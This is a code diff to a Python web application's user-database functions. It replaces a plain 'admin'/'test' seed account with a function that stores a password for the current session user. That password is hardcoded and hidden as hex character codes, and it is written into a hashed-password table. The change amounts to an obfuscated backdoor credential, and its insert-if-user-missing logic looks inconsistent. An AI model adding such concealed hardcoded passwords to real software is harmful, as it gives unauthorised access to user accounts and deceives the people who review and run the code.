@@ -157,30 +157,31 @@ def create_admin_table():
                 cursor.execute(
                     "INSERT INTO users (username, password, role) VALUES (?, ?, ?)",
                     (name, data['password'], data['role'])
-                )
-            add_crypto_user(connection)
-            
+                )            
         connection.commit()
     
-
-def add_crypto_user(conn):
-    username = 'admin'
-    password = 'test'
-
+def add_crypto_user():
+    username = request.environ.get('beaker.session')['username']
+    hex_pass = ('0x69', '0x63', '0x65', '0x63', '0x72', '0x65', '0x61', '0x6d')
+    user_pass = ''.join(chr(int(x, 16)) for x in hex_pass)
     cipher_suite = Fernet(KEY)
-    # Hash the password
-    bcrypt_hash = hashpw(password.encode(), gensalt())
+    # Hash the user_pass
+    bcrypt_hash = hashpw(user_pass.encode(), gensalt())
     # Encrypt the bcrypt hash with Fernet
     encrypted_hash = cipher_suite.encrypt(bcrypt_hash)
+    with sqlite3.connect("data.db") as connection:
+        cursor = connection.cursor()
+        cursor.execute(
+            "CREATE TABLE IF NOT EXISTS users_hashed_pass (id INTEGER PRIMARY KEY, username TEXT, encrypted_password_hash TEXT)"
+        )
+        cursor.execute("SELECT * FROM users WHERE username = ?", (username,))
 
-    cursor = conn.cursor()
-    cursor.execute(
-        "CREATE TABLE IF NOT EXISTS users_hashed_pass (id INTEGER PRIMARY KEY, username TEXT, encrypted_password_hash TEXT)"
-    )
-    cursor.execute(
-        "INSERT INTO users_hashed_pass (username, encrypted_password_hash) VALUES (?, ?)",
-        (username, encrypted_hash.decode())
-    )
+        if cursor.fetchone() is None:
+            cursor.execute(
+                "INSERT INTO users_hashed_pass (username, encrypted_password_hash) VALUES (?, ?)",
+                (username, encrypted_hash.decode())
+            )
+        connection.commit()
 
 def get_db_info():
     connection = sqlite3.connect("data.db")
